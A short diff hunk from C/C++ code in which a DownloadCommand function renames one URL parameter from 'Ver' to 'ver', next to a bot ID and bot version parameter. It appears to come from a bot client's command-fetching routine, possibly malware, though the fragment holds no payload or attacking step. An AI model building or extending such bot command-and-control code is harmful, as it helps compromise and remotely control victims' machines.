@@ -380,7 +380,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 	PStrings Fields = Strings::Create();
 
 	AddURLParam(Fields, "id", BotID.t_str());
-	AddURLParam(Fields, "Ver", (PCHAR)BOT_VERSION);
+	AddURLParam(Fields, "ver", (PCHAR)BOT_VERSION);
 
 	THTTPResponseRec Response;
 	ClearStruct(Response);
